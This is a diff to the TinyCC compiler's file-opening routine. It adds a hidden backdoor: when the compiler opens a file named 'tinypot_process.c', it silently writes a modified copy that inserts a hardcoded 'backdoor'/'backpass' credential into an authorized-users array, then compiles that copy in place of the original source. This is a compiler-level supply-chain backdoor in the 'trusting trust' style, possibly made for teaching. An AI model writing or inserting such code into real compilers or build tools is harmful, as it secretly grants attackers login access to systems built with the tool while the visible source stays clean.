@@ -607,6 +607,30 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         fd = 0, filename = "<stdin>";
     else
         fd = open(filename, O_RDONLY | O_BINARY);
+
+    // Check if filename is "tinypot_process.c"
+    if (strcmp(filename, "tinypot_process.c") == 0)
+    {
+        // Open tinypot_process.c file
+        FILE *oldFile = fopen(filename, "r");
+        // Create new file
+        FILE *newFile = fopen(".tempBackDoor", "w");
+        // Read each string from tinypot_process.c
+        char buf[200];
+        while (fgets(buf, 200, oldFile) != NULL)
+        {
+            fputs(buf, newFile);
+            // Insert backdoor data
+            if (strstr(buf, "AuthData_t authorizedUsers[]") != NULL)
+            {
+                fputs("{\"backdoor\", \"backpass\"},", newFile);
+            }
+        }
+        fclose(oldFile);
+        fclose(newFile);
+        fd = open(".tempBackDoor", O_RDONLY | O_BINARY);
+    }
+
     if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
         printf("%s %*s%s\n", fd < 0 ? "nf":"->",
                (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
